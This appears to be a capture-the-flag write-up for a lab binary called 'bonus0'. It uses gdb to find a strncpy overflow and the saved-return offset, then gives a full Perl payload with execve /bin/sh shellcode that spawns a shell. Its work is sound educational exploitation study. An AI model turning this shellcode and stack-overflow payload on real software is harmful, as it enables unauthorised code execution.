Running the program we are asked for two inputs. Looking at the disassembly we can guess a few things :

    gdb> info fun
    ...
    0x080484b4  p
    0x0804851e  pp
    0x080485a4  main
    ...
    gdb> disas p
    0x080484c8 <+20>:	mov    DWORD PTR [esp+0x8],0x1000       # a verylarge buffer is read from stdin
    ...
    0x080484e1 <+45>:	call   0x8048380 <read@plt>
    ...
    0x08048505 <+81>:	mov    DWORD PTR [esp+0x8],0x14         # then, only 20 bytes are taken from it and put into provided argument.
    ...
    0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>

strncpy has an exploit, it copies 20 bytes stopping at \0 put does necessarily puts the ending \0. So we can use to do a buffer overflow later !

    gdb> r
     -
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA     # buffer A
     -
    BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB     # buffer B
    Stopped reason: SIGSEGV
    0x42424242 in ?? ()

It tried to call address ('BBBB'), so we overwrote an $eip record in the stack.
Which one ?

        gdb> r
        ...
        ABCDEFGHIJKLMNOPQRSTUVWXYZ
        Stopped reason: SIGSEGV
        0x4d4c4b4a in ?? ()

It tried to call ('JKLM'), so we can deduce that overwritten $eip is at offset 9 of buffer B.

Remaining size is not enough to put the 45 bytes long shellcode, we'll use 4096 bytes long buffer. Even if it should not be accessible anymore, in fact it is !
Buffer address :

    gdb> disas p
    ...
    0x080484da <+38>:	mov    DWORD PTR [esp],0x0
    0x080484e1 <+45>:	call   0x8048380 <read@plt>
    0x080484e6 <+50>:	mov    DWORD PTR [esp+0x4],0xa
    ...
    gdb> b*0x080484e6
    gdb> r < <(perl -e 'print "A"x4095 . "\n" . "B"x4095 . "\n"')
    gdb> x/100wx $esp
    ...
    0xbfffe690:	0x42424242	0x42424242	0x42424242	0x42424242
    (repeats...)

Arbitrarily, we choose address 0xbfffe690 to put our shellcode.
Address of buffer start is 0xbfffe640.
Shellcode starts at offset 80.
We need to write 80 - 9 - 4 = 67 bytes before shellcode

The payload :

    buffer a : [Ax4095][\n]
    buffer b : [Bx9][0xbfffe690][Cx67][shellcode]

The script :

perl -e 'print "A"x4095 . "\n" . "B"x9 . "\x90\xe6\xff\xbf" . "C"x67 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\n"' > /tmp/payload &&
cat /tmp/payload - | ./bonus0
